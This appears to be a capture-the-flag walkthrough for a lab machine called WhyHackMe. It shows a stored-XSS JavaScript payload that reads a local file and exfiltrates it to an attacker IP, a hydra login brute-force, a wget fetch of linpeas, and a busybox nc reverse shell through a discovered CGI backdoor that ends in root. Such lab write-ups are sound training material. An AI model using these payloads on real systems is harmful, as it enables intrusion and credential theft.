# WhyHackMe - Medium

```sh
sudo vim /etc/hosts
# map IP to whyhackme.thm

nmap -T4 -p- -A -Pn -v whyhackme.thm
```

* open ports & services:

    * 21/tcp - ftp - vsftpd 3.0.3
    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
    * 80/tcp - http - Apache httpd 2.4.41

* checking the FTP service:

    ```sh
    ftp anonymous@whyhackme.thm
    # anonymous login works

    ls -la
    # only one file

    get update.txt

    exit

    cat update.txt
    ```

* from the .txt file, we get a username 'mike', but this account is removed now; also a note from 'admin' that says the creds of a new account can be accessed at '127.0.0.1/dir/pass.txt'

* checking the webpage on port 80, it refers to a blog at /blog.php

* the blog page gives us a link for /login.php; it also has a comment by user 'admin' saying that all comments would be monitored

* /login.php leads to a login page with username and password fields

* we can attempt to bruteforce login using ```hydra``` - get the login request format using Developer Tools or Burp Suite:

    ```sh
    hydra -l admin -P /usr/share/wordlists/rockyou.txt -f whyhackme.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid username or password</p>"
    # test bruteforce for 'admin'
    ```

* we can do a directory scan simultaneously:

    ```sh
    gobuster dir -u http://whyhackme.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 10
    ```

* ```gobuster``` gives us a few endpoints:

    * /register.php - we can create a test account here
    * /dir - 403 Forbidden
    * /assets - has CSS files
    * /config.php - cannot check this

* by creating an account on /register.php, we can now log into /login.php

* after logging in, the website informs us that commenting on blogs is now possible

* we can now see that we have an input field in /blog.php for comments; we have a submit button and a delete button (to remove all comments)

* we can submit a comment and intercept this request in Burp Suite, and send to Repeater for further testing

* it is a POST request to /blog.php with the 'comment' parameter having the comment text as value

* similarly, the delete action is a POST request to /blog.php with the data 'delete=Delete'

* we can now test for injection attacks like SQLi and command injection, for example

* using ```sqlmap``` as well as manual tests for SQLi does not yield anything; similarly testing for command injection also does not help

* testing with XSS payloads in the comment input field also does not work

* from the 'update.txt' note, as a hint regarding localhost was given, we can attempt for SSRF (server-side request forgery) attacks

* using SSRF payloads in the comment input field does not give any leads

* we can test in the /register.php and /login.php fields for any injection attacks

* testing for XSS attacks in the /register.php page, we can see that if we use payload such as ```<script>alert(1)</script>``` in the username field, and then login with this username, and then comment anything, when the page loads we get the alert pop-up, which confirms XSS injection works; and the comments do not show our username as well

* the logic here is to test all possible input fields, and in this case, as our username is showing up in the comments (and the comments input field is not responding to any injection attempts), we need to test with username next

* as we already have a target file at 'localhost/dir/pass.txt', we can attempt to fetch this resource from the internal service

* another hint is that the website mentions 'admin' is constantly monitoring the comments, so it is directing towards a server-side or a session-based attack

* Googling for XSS and data exfiltration methods leads to [this blog](https://www.trustedsec.com/blog/simple-data-exfiltration-through-xss)

* we can follow the above PoC; I'm following [this PoC for blind SSRF data exfiltration](https://github.com/SrivathsanNayak/ethical-hacking-notes/blob/main/HTBAcademy/ServerSide/README.md#ssrf) to fetch the internal resource:

    * host the JS file for data exfiltration:

        ```js
        var readfile = new XMLHttpRequest();
        // to read local file

        var exfil = new XMLHttpRequest();
        // to send file to attacker server

        readfile.open("GET", "http://127.0.0.1/dir/pass.txt", true);
        readfile.send();
        readfile.onload = function() {
            // once the file is ready - XMLHttpRequest.DONE = 4
            if (readfile.readyState === 4) {
                var url = 'http://192.168.135.208/?data='+btoa(this.response);
                // sends data in base64 encoding
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        ```

        ```sh
        sudo python3 -m http.server 80
        ```
    
    * once the JS file is hosted, submit the following XSS payload (which mentions the JS file) in the username field in /register.php:

        ```sh
        <script src=http://192.168.135.208/evil.js></script>
        ```
    
    * once the account is created, we can login using this same payload, then submit a comment

* after the comment gets submitted, we would not be able to immediately read the file as we do not have access to it

* however due to the nature of the payload, once the 'admin' user accesses this page, the XSS is triggered again, and we get the data exfiltrated to our Python server logs in base64 format

* decoding the base64 data, we get the creds 'jack:WhyIsMyPasswordSoStrongIDK' - we can attempt to log into SSH using these:

    ```sh
    ssh jack@whyhackme.thm
    # this works

    cat user.txt
    # user flag

    # fetch linpeas for basic enum

    wget http://192.168.135.208:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * box running Linux version 5.4.0-159-generic, Ubuntu 20.04.5
    * ```sudo -l``` shows we can run ```/usr/sbin/iptables``` as root
    * there are some files in ```/opt```

* Google shows that ```iptables``` is for configuring the Netfilter framework in Linux; and it's mainly used for firewall management, NAT, packet filtering, etc.

* checking this binary further:

    ```sh
    /usr/sbin/iptables --help
    ```

* ```iptables``` is on version 1.8.4; Googling does not give any exploits related to this

* checking the files in ```/opt```:

    ```sh
    ls -la /opt
    # we have two files here - a pcap and a text file

    cat /opt/urgent.txt
    ```

* from the 'urgent.txt' file, we can see that an attacker has placed some files in ```/usr/lib/cgi-bin``` and it cannot be removed by root; a pcap file has been captured

* also the root user has blocked the attackers' backdoor access temporarily using ```iptables``` rules

* we can check the capture first - transfer to attacker:

    ```sh
    scp jack@whyhackme.thm:/opt/capture.pcap .

    wireshark capture.pcap
    ```

* the capture shows TLS encrypted data so we can check this later

* checking the other things mentioned in the note:

    ```sh
    ls -la /usr/lib/cgi-bin
    # permission denied

    sudo iptables -L
    # list rules
    ```

    ```js
    Chain INPUT (policy ACCEPT)
    target     prot opt source               destination         
    DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
    ACCEPT     all  --  anywhere             anywhere            
    ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
    ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
    ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
    DROP       all  --  anywhere             anywhere            

    Chain FORWARD (policy ACCEPT)
    target     prot opt source               destination         

    Chain OUTPUT (policy ACCEPT)
    target     prot opt source               destination         
    ACCEPT     all  --  anywhere             anywhere 
    ```

* the ```iptables``` rules show that all traffic headed towards destination port 41312 is configured to drop, and the other rules accept SSH, HTTP, ICMP; an explicit drop is also included in the end

* as we have ```sudo``` rights over ```iptables```, we can attempt to remove the first rule for now - this could be the backdoor left by the attacker:

    ```sh
    # to remove first rule from INPUT chain
    sudo iptables -D INPUT 1

    sudo iptables -L
    # the rule is not longer listed
    ```

* now we can attempt to scan this port to know more about the backdoor:

    ```sh
    nmap -T4 -p 41312 -A -Pn whyhackme.thm
    ```

* this shows a http service on tcp/41312; navigating to the webpage gives 400 Bad Request and shows we need to use SSL

* navigating to 'https://whyhackme.thm:41312/', we get 403 Forbidden, which indicates we need to find a way to access the backdoor

* going back to the packet capture, we need a server private key to decrypt the TLS traffic

* to check for the server config, we need to enumerate the target - ```linpeas``` output had provided this earlier at ```/etc/apache2/sites-enabled/000-default.conf```:

    ```sh
    cat /etc/apache2/sites-enabled/000-default.conf
    ```

* this includes the web server config for the virtual hsot running on port 41312 - it also includes the path to the SSL certificate key file, we can transfer it to attacker:

    ```sh
    scp jack@whyhackme.thm:/etc/apache2/certs/apache.key .
    ```

* now we can import the server's private key file in Wireshark > Edit > Preferences > Protocols > TLS > RSA Keys List > Edit > click on '+' to create a new entry and fill the following details:

    * IP address - IP of target
    * port - 41312
    * protocol - tcp (uppercase TCP does not work)
    * key file - upload the 'apache.key' file
    * password - None

* once we submit these for TLS decrypt, we can now see the decrypted HTTP packets

* the HTTP packets show the request that the attacker is using to execute commands:

    ```sh
    GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id HTTP/1.1
    ```

* we can attempt to use the same format in our requests to see if we can access the backdoor:

    ```sh
    curl -k 'https://whyhackme.thm:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id'
    # -k to disable certificate validation
    # otherwise it will give SSL error
    ```

* this works, and we have RCE as the 'h4ck3d' group; we can use this to get reverse shell:

    ```sh
    nc -nvlp 5555

    curl -k 'https://whyhackme.thm:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=busybox%20nc%20192.168.135.208%205555%20-e%20bash'
    # use URL-encoded revshell one-liner
    # this works
    ```

* we get the reverse shell:

    ```sh
    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    whoami
    # www-data

    id
    # we are part of 'h4ck3d' group

    sudo -l
    # we can run all commands as root

    sudo su -
    # this gives root shell

    cat /root/root.txt
    # root flag
    ```
